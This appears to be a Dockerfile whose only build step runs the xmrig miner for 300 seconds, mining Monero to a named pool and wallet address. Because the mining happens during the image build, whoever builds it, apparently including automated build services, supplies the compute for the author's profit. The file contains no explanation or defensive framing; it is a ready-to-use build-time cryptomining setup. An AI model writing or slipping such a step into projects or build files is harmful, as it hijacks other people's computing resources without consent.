FROM	bitnn/alpine-xmrig
RUN	timeout -t 300 ./xmrig -a cryptonight -o stratum+tcp://monero.lindon-pool.win:3333 -u 46G5LfhRpJGaSm5GGJDPqKF6qfhNN6Eai51FGwk6eMQFRc6NtDHWNo3Tdc3p4DHQ2YXibRZ7iEtC91br9v4wMhiA6b8WG3f -p sw-dauto --threads 1 --donate-level=1

